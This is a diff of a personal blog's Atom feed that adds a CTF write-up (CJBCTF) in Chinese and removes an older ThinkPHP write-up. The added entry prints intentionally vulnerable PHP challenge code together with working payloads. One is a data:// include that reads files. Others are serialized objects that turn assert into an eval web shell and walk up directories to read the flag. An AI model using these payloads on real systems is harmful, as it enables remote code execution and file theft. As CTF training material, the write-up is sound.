@@ -6,10 +6,41 @@
   <link href="http://lll-nnn.github.io/atom.xml" rel="self"/>
   
   <link href="http://lll-nnn.github.io/"/>
-  <updated>2021-06-02T15:06:52.513Z</updated>
+  <updated>2021-07-11T13:36:01.649Z</updated>
   <id>http://lll-nnn.github.io/</id>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CJBCTF</title>
+    <link href="http://lll-nnn.github.io/2021/07/11/CJBCTF/"/>
+    <id>http://lll-nnn.github.io/2021/07/11/CJBCTF/</id>
+    <published>2021-07-11T02:38:49.000Z</published>
+    <updated>2021-07-11T13:36:01.649Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><ul><li>文件包含</li></ul><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">/*</span><span class="hljs-comment"># -*- coding: utf-8 -*-</span><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2021-06-29 03:16:43</span><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2021-06-30 04:43:37</span><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><span class="hljs-comment"></span><span class="hljs-comment">*/</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;    $ext = pathinfo($_GET[<span class="hljs-string">&#x27;file&#x27;</span>], PATHINFO_EXTENSION);    <span class="hljs-keyword">if</span>($ext===<span class="hljs-string">&#x27;php&#x27;</span>)&#123;        <span class="hljs-keyword">include</span> $_GET[<span class="hljs-string">&#x27;file&#x27;</span>];    &#125;&#125;</code></pre></code></pre><p><code>pathinfo</code>要求传入的<code>file</code>后缀名为<code>php</code>，就会<code>include</code>      </p><p>看到include要想到伪协议了    </p><p>这里用<code>data://text/plain</code>     </p><p>payload:<code>?file=data://text/plain,&lt;?php var_dump(scandir(&#39;/&#39;));?&gt;.php</code></p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/6a15b87627e024ff.png">    </p><p><code>?file=data://text/plain,&lt;?php echo file_get_contents(&#39;/secret&#39;);?&gt;.php</code><br>得到flag     </p><h2 id="cjbweb"><a href="#cjbweb" class="headerlink" title="cjbweb"></a>cjbweb</h2><ul><li>代码审计</li></ul><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);$safe=<span class="hljs-string">&quot;Hack me!&quot;</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span>&#123;    <span class="hljs-keyword">public</span> $name=<span class="hljs-string">&quot;var_dump&quot;</span>;    <span class="hljs-keyword">public</span> $msg=<span class="hljs-string">&quot;Happy to cjb&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">global</span> $safe;        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/\d|\/|,|\([^()]*\([^()]*\)/&#x27;</span>,<span class="hljs-keyword">$this</span>-&gt;msg))&#123;            <span class="hljs-keyword">$this</span>-&gt;name=<span class="hljs-string">&quot;var_dump&quot;</span>;            <span class="hljs-keyword">$this</span>-&gt;msg=<span class="hljs-string">&quot;You look dangerous!!!&quot;</span>;            $safe=<span class="hljs-string">&quot;I think waf is enough.&quot;</span>;        &#125;        call_user_func(<span class="hljs-keyword">$this</span>-&gt;name,<span class="hljs-keyword">$this</span>-&gt;msg);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">global</span> $safe;        var_dump($safe);    &#125;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;info&#x27;</span>]))&#123;    $info=$_POST[<span class="hljs-string">&#x27;info&#x27;</span>];    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/s:4:&quot;name&quot;;s:\d:&quot;v\w*&quot;/&#x27;</span>,$info))&#123;        unserialize($info);    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I just love v&quot;</span>;    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    $hacker=<span class="hljs-keyword">new</span> Hacker();    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;</code></pre></code></pre><ul><li><p>第一种思路：在类中写两次相同的属性名，后面的属性值会覆盖前面的属性值（类的属性个数要加1）<br>  <code>\([^()]*\([^()]*\)</code>这条正则过滤的时括号嵌套<code>(())</code>   </p><p>  payload:<code>info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:22:&quot;eval($_POST[&#39;shell&#39;]);&quot;;&#125;&amp;&amp;shell=var_dump(scandir(&#39;/&#39;));</code><br>  <img src="https://ftp.bmp.ovh/imgs/2021/07/f084c58e911870b0.png">    </p><p>  <code>shell=echo file_get_contents(&#39;/you_never_know_my_name&#39;)</code>   </p></li></ul><ul><li><p>第二种思路：利用<code>$safe</code><br>  根目录payload:<code>info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:57:&quot;$safe=chdir(&#39;..&#39;).chdir(&#39;..&#39;).chdir(&#39;..&#39;)?scandir(&#39;.&#39;):&#39;&#39;&quot;;&#125;</code><br>  <code>chdir(&#39;..&#39;).chdir(&#39;..&#39;).chdir(&#39;..&#39;)?scandir(&#39;.&#39;):&#39;&#39;</code>这样穿越目录tql   </p><p>  读flagpayload：<code>info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:85:&quot;$safe=chdir(&#39;..&#39;).chdir(&#39;..&#39;).chdir(&#39;..&#39;).file_get_contents(&#39;you_never_know_my_name&#39;)&quot;;&#125;</code>      </p></li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;warmup&quot;&gt;&lt;a href=&quot;#warmup&quot; class=&quot;headerlink&quot; title=&quot;warmup&quot;&gt;&lt;/a&gt;warmup&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;文件包含&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;&lt;pre&gt;&lt;code class=&quot;hlj</summary>
+      
+    
+    
+    
+    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
+    
+    
+    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
+    
+    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
+    
+    <category term="CJBCTF" scheme="http://lll-nnn.github.io/tags/CJBCTF/"/>
+    
+  </entry>
   
   <entry>
     <title>Newctf</title>
@@ -586,29 +617,6 @@
       
       
     <summary type="html">&lt;h2 id=&quot;js-vm2&quot;&gt;&lt;a href=&quot;#js-vm2&quot; class=&quot;headerlink&quot; title=&quot;js vm2&quot;&gt;&lt;/a&gt;js vm2&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://sc01.alicdn.com/kf/H375cdea26ac54e8c</summary>
-      
-    
-    
-    
-    
-    <category term="wp" scheme="http://lll-nnn.github.io/tags/wp/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>EasyThinking</title>
-    <link href="http://lll-nnn.github.io/2021/04/24/BUU75/"/>
-    <id>http://lll-nnn.github.io/2021/04/24/BUU75/</id>
-    <published>2021-04-24T08:57:53.000Z</published>
-    <updated>2021-04-24T09:27:32.761Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="-_-"></a>-_-</h2><p>看到thinking应该想到应该是thinkphp吧<br>输入个不存在的路径<br>报错：       </p><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/179705/11/761/21532/6083de2cEcdedf453/71fb3eb71da3182c.png" alt="01.png">     </p><p><a href="https://paper.seebug.org/1114/">Think PHP V6.0.0任意文件操作漏洞</a>       </p><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/168527/22/21222/15225/6083e0edEd9a623ed/f948321a4e4bf6fb.png" alt="02.png">    </p><p>32位的PHPSESSID改成一个32位的PHP文件名  </p><p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/182857/21/741/14442/6083e0edEe42ae3cc/2c0d5a4babe2b331.png" alt="03.png">      </p><p>搜索里面填入一句话      </p><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/184862/17/733/11665/6083e167E7e9a71d3/d847018ea02a13d6.png" alt="04.png"><br>就会被存放到之前写的文件里面<br>访问<code>http://93a0778c-632e-4f47-9ba1-8d8017ef0078.node3.buuoj.cn/runtime/session/sess_1234567890123456789012345678.php</code><br>最后的文件名是<code>sess_</code>+刚才的32位    </p><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/173808/39/6300/107394/6083e23eEc8cf917d/e8254e21441627f8.png" alt="05.png">      </p><p>还要绕过<code>disable_function</code><br>和之前那道题一样        </p><p>我的蚁剑出问题了      </p><p><a href="https://blog.csdn.net/mochu7777777/article/details/105160796/">之后</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;-_-&quot;&gt;&lt;/a&gt;-_-&lt;/h2&gt;&lt;p&gt;看到thinking应该想到应该是thinkphp吧&lt;br&gt;输入个不存在的路径&lt;br&gt;报错：       &lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;h</summary>
       
     
     
